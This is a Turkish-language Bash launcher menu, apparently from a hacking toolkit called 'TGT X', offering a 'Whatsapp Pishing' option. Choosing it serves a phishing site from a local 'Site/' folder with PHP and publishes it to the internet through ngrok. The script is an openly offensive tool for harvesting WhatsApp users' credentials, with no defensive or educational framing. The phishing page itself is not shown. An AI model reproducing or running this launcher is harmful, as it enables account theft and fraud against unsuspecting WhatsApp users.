#!/bin/bash

clear
echo -e '
 \e[32m
 _____________________   __   __
|__   __/ __ _|__   __|  \ \ / /
   | | | |  __   | |      \ V / 
   | | | | |_ |  | |       > <  \e[37m   Whatsapp \e[32m
   | | | |__| |  | |      / . \ 
   |_|  \_____|  |_|     /_/ \_\

   \e[32m=============================   


\e[31m=====================================|
|\e[32m[01]\e[32m Whatsapp Pishing               \e[31m|  
\e[31m=====================================|
 

\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit

 '
echo -e "\033[31;40;1m"
echo ""
read -p "| Numara Seçiniz:" islem
if [[ $islem == 1 || $islem == 01 ]]; then
read -p "Port Numarası Giriniz : " port
sleep 3
echo ""
echo -e "\e[33mKodunuz Code: whatsapp"
sleep 2
echo ""
echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
sleep 4
cd Site/
php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mTurkish Guy Tim İyi Günler Diler"
sleep 1 
exit 1
elif [[ $islem == 00 ]]; then
cd ..
cd ..
bash tgtx.sh
else 
	echo -e '\033[31;40;1m Lütfen İşlem Numaranızı Kontrol Edin!'
	sleep 2
	clear
	bash Whatsapp.sh
fi
